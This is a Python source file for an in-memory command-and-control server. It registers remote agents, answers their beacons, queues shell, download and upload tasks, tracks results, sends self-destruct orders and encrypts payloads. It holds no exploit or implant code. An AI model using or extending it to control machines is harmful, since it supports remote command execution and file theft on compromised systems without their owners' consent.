import asyncio
import uuid
import logging
import json
from typing import Dict, List, Optional
from datetime import datetime, timezone
from pydantic import BaseModel
from cryptography.fernet import Fernet

logger = logging.getLogger(__name__)

# Pydantic models for internal use
class TaskModel(BaseModel):
    id: str
    agent_id: str
    type: str # shell, download, upload, etc
    data: Dict
    priority: int
    status: str # pending, completed, failed
    created_at: datetime
    completed_at: Optional[datetime] = None
    result: Optional[Dict] = None

class AgentModel(BaseModel):
    id: str
    info: Dict
    registered_at: datetime
    last_seen: datetime
    status: str

class C2Server:
    """
    Command & Control server for managing remote agents.
    """
    
    def __init__(self):
        self.agents: Dict[str, AgentModel] = {}
        self.tasks: Dict[str, TaskModel] = {}
        # Generate or load key
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)

    async def register_agent(self, agent_info: Dict) -> str:
        agent_id = str(uuid.uuid4())
        
        agent = AgentModel(
            id=agent_id,
            info=agent_info,
            registered_at=datetime.now(timezone.utc),
            last_seen=datetime.now(timezone.utc),
            status="active"
        )
        
        self.agents[agent_id] = agent
        logger.info(f"[C2] New agent registered: {agent_id} ({agent_info.get('hostname', 'unknown')})")
        return agent_id
    
    async def agent_beacon(self, agent_id: str) -> List[Dict]:
        if agent_id not in self.agents:
            logger.warning(f"[C2] Beacon from unknown agent: {agent_id}")
            # In a real scenario, could trigger re-registration instructions
            return []
        
        # Update last seen
        self.agents[agent_id].last_seen = datetime.now(timezone.utc)
        self.agents[agent_id].status = "active"
        
        # Get tasks
        pending = [
            t.dict() for t in self.tasks.values() 
            if t.agent_id == agent_id and t.status == "pending"
        ]
        
        # Sort by priority (asc means 1 is first? plan said 1=max)
        pending.sort(key=lambda x: x['priority'])
        
        return pending

    async def submit_task(self, 
                         agent_id: str,
                         task_type: str,
                         task_data: Dict,
                         priority: int = 5) -> str:
        if agent_id not in self.agents:
            raise ValueError("Unknown agent")
            
        task_id = str(uuid.uuid4())
        task = TaskModel(
            id=task_id,
            agent_id=agent_id,
            type=task_type,
            data=task_data,
            priority=priority,
            status="pending",
            created_at=datetime.now(timezone.utc)
        )
        
        self.tasks[task_id] = task
        logger.info(f"[C2] Task queued: {task_id} ({task_type}) for agent {agent_id}")
        return task_id

    async def task_result(self, task_id: str, result: Dict, success: bool):
        if task_id not in self.tasks:
            logger.warning(f"[C2] Result for unknown task: {task_id}")
            return
            
        task = self.tasks[task_id]
        task.status = "completed" if success else "failed"
        task.result = result
        task.completed_at = datetime.now(timezone.utc)
        
        logger.info(f"[C2] Task completed: {task_id} (success={success})")

    async def get_agent_status(self, agent_id: str) -> Dict:
        if agent_id not in self.agents:
            raise ValueError("Unknown agent")
            
        agent = self.agents[agent_id]
        # Check if alive (saw within last 5 mins)
        is_alive = (datetime.now(timezone.utc) - agent.last_seen).total_seconds() < 300
        
        tasks_total = len([t for t in self.tasks.values() if t.agent_id == agent_id])
        tasks_pending = len([t for t in self.tasks.values() if t.agent_id == agent_id and t.status == "pending"])
        
        return {
            "id": agent.id,
            "info": agent.info,
            "status": "active" if is_alive else "dead",
            "registered_at": agent.registered_at.isoformat(),
            "last_seen": agent.last_seen.isoformat(),
            "tasks_total": tasks_total,
            "tasks_pending": tasks_pending
        }

    async def kill_agent(self, agent_id: str):
        await self.submit_task(
            agent_id=agent_id,
            task_type="self_destruct",
            task_data={},
            priority=1
        )
        if agent_id in self.agents:
            self.agents[agent_id].status = "terminated"

    def encrypt_payload(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)
    
    def decrypt_payload(self, encrypted: bytes) -> bytes:
        return self.fernet.decrypt(encrypted)

